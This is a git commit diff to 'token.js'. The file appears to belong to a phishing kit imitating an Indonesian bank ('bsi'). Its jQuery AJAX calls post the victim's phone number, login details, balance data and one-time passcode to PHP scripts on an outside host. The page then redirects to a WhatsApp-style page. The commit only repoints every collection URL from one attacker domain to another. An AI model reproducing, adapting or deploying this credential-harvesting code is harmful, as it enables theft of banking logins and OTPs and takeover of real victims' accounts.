02c4df05b5e4afe517cc1f2ce2b3bd6dbfe013e7
dodypribadi5 <dodypribadi5@gmail.com>
2025-02-18 20:23:32 +0700

    Update token.js

--- token.js
+++ token.js
@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/s6v2/no.php',
+            url: 'https://anjayhostjon.cloud/bsi/w9d7/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/s6v2/login.php',
+            url: 'https://anjayhostjon.cloud/bsi/w9d7/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://zheuz.cloud/bsi/s6v2/saldo.php',
+            url: 'https://anjayhostjon.cloud/bsi/w9d7/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://zheuz.cloud/bsi/s6v2/otp.php',
+ url: 'https://anjayhostjon.cloud/bsi/w9d7/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -123,7 +123,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://zheuz.cloud/wa/s6v2';
+location.href='https://anjayhostjon.cloud/wa/w9d7';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
